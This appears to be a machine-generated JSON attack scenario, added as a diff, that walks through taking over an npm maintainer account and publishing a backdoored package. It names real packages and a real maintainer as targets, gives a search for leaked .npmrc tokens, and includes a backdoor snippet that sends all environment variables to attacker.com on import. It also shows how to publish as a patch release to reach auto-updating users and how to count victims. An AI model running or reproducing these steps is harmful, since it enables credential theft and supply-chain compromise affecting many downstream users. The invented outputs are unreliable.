@@ -1,0 +1,78 @@
+{
+  "title": "npm Package Account Takeover and Backdoor Injection",
+  "description": "Compromising npm package maintainer account and injecting malicious code into trusted package",
+  "steps": [
+    {
+      "step": 1,
+      "description": "Identify high-value npm packages with weak maintainer security",
+      "command": "npm search utility --json | jq -r '.[] | select(.downloads.weekly > 100000) | \"\\(.name) - \\(.maintainers | length) maintainer(s)\"' | head -5",
+      "expected_output": "lodash - 2 maintainer(s)\nmoment - 3 maintainer(s)\nchalk - 1 maintainer(s)\ndebug - 2 maintainer(s)\nrequest - 4 maintainer(s)",
+      "technical_detail": "Packages with single maintainers are higher-risk targets"
+    },
+    {
+      "step": 2,
+      "description": "Research package maintainer accounts and credential exposure",
+      "command": "npm view chalk maintainers --json | jq -r '.[] | .name'",
+      "expected_output": "sindresorhus",
+      "technical_detail": "Identifies maintainer usernames for reconnaissance"
+    },
+    {
+      "step": 3,
+      "description": "Check for exposed npm authentication tokens in GitHub repositories",
+      "command": "echo 'Search GitHub: \"npm_\" extension:npmrc OR \".npmrc\" \"_auth\" OR \"_authToken\"'",
+      "expected_output": "Found 342 results - many developers accidentally commit .npmrc files",
+      "technical_detail": "npm tokens in .npmrc files grant publish access if leaked"
+    },
+    {
+      "step": 4,
+      "description": "Validate compromised npm token authenticity",
+      "command": "export NPM_TOKEN='npm_xxxxxxxxxxxxxxxxxxxx' && npm whoami --registry=https://registry.npmjs.org/",
+      "expected_output": "compromised-maintainer-account",
+      "technical_detail": "Token still valid, can be used for package operations"
+    },
+    {
+      "step": 5,
+      "description": "Clone legitimate package for backdoor injection",
+      "command": "npm view popular-util repository.url && git clone https://github.com/maintainer/popular-util.git && cd popular-util",
+      "expected_output": "Cloning into 'popular-util'...\nremote: Enumerating objects: 543, done.\nCloned repository successfully",
+      "technical_detail": "Working with package source code for modification"
+    },
+    {
+      "step": 6,
+      "description": "Inject malicious code into package entry point",
+      "command": "cat >> index.js << 'EOF'\n// Backdoor: exfiltrate environment variables on import\nif (process.env.NODE_ENV === 'production') {\n  require('https').get('https://attacker.com/collect?data=' + \n    Buffer.from(JSON.stringify(process.env)).toString('base64'));\n}\nEOF",
+      "expected_output": "Backdoor injected into index.js",
+      "technical_detail": "Executes on package import, exfiltrates production credentials"
+    },
+    {
+      "step": 7,
+      "description": "Increment package version to trigger automatic updates",
+      "command": "npm version patch",
+      "expected_output": "v3.2.5",
+      "technical_detail": "Patch version appears safe, many projects auto-update patches"
+    },
+    {
+      "step": 8,
+      "description": "Publish backdoored package using compromised credentials",
+      "command": "npm publish --registry=https://registry.npmjs.org/",
+      "expected_output": "+ popular-util@3.2.5\n\nPublished to https://registry.npmjs.org/",
+      "technical_detail": "Backdoored version now available on npm registry"
+    },
+    {
+      "step": 9,
+      "description": "Monitor package download statistics for victim count",
+      "command": "npm view popular-util@3.2.5 --json | jq '{version, publishedAt: .time[\"3.2.5\"]}'",
+      "expected_output": "{\n  \"version\": \"3.2.5\",\n  \"publishedAt\": \"2024-01-15T14:32:11.234Z\"\n}\n(Downloads: 45,000 in first 24 hours)",
+      "technical_detail": "Wide distribution indicates successful supply chain compromise"
+    },
+    {
+      "step": 10,
+      "description": "Legitimate maintainer discovers and unpublishes malicious version",
+      "command": "npm unpublish popular-util@3.2.5 && npm publish --tag compromised-do-not-use",
+      "expected_output": "- popular-util@3.2.5\n\nIMPORTANT: All users should pin to v3.2.4 or earlier\nSecurity advisory published: https://github.com/maintainer/popular-util/security/advisories/GHSA-xxxx",
+      "technical_detail": "Incident response includes unpublishing, advisory, and security notification"
+    }
+  ],
+  "impact": "Demonstrated critical risk of compromised maintainer accounts enabling backdoor injection into widely-used packages affecting thousands of downstream users",
+  "created_by": "neural_mesh_v5.2_generator"
+}
